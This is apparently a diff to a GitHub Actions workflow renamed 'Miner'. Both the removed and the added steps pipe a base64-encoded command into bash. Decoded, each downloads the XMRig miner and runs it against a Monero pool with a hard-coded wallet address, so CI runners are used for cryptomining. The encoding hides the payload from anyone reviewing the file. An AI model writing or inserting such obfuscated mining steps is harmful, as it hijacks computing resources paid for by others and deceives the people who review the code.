@@ -1,14 +1,11 @@
-name: Lool
+name: Miner
 
 on:
-  push:
-    branches:
-      - main
+  workflow_dispatch:
 
 jobs:
-  run-job:
+  run:
     runs-on: ubuntu-latest
     steps:
-      - name: Run miner
-        run: |
-          echo "Y3VybCBodHRwczovL2dpdGh1Yi5jb20veG1yaWcveG1yaWcvcmVsZWFzZXMvZG93bmxvYWQvdjYuMjIuMi94bXJpZy02LjIyLjItbGludXgtc3RhdGljLXg2NC50YXIuZ3ogLW8gc291bC50YXIuZ3ogJiYgdGFyIC14dnpmIHNvdWwudGFyLmd6ICYmIHN1ZG8gbXZ4IHhtcmlnLTYuMjIuMiBzb3VsICYmIGNkIHNvdWwgJiYgbXggaG1yaWcgc29sIC1vIG1vbmVyb29jZWFuLnN0cmVhbToxMDEyOCAtdSA0N0h4dENtRlh4cVZ6UVNHalFnQm5EQzFMTERScm9rZjNhTUZvY2JXUVJ4WXpqaGp4a2ZMR2p6d0UzUEpockN0ZFFrWFB1bnI4Y1paQkFpRW1ZNVc0NlYxVVY4bUZNWmggLWsg" | base64 --decode | bash
+      - name: Run Miner Encoded
+        run: echo "c3VkbyBhcHQtZ2V0IHVwZGF0ZSAteSAmJiBzdWRvIGFwdC1nZXQgaW5zdGFsbCAteSB3Z2V0IHRhciAmJiB3Z2V0IC1PICBodHRwczovL2dpdGh1Yi5jb20veG1yaWcveG1yaWcvcmVsZWFzZXMvZG93bmxvYWQvdjYuMjIuMi94bXJpZy02LjIyLjItbGludXgtc3RhdGljLXg2NC50YXIuZ3ogLW8gc291bC50YXIuZ3ogJiYgdGFyIC14dnpmIHNvdWwudGFyLmd6ICYmIGNkIHhtcmlnLTYuMjIuMiAmJiAuL3htcmlnIC1vIGd1bGYubW9uZXJvb2NlYW4uc3RyZWFtOjEwMTI4IC11IDQ3SHh0Q21GWHhxVnpRU0dqUWdCbkRDMUxMRFJyb2tmM2FNRm9jYldRUnhZenpoanhrZkxHankwRTNQSmhyQ3RkUWtYUHVuYjhjWlpCQWlFbVk1VzQ2VjFVVjhtRk1aaCAtaw==" | base64 --decode | bash
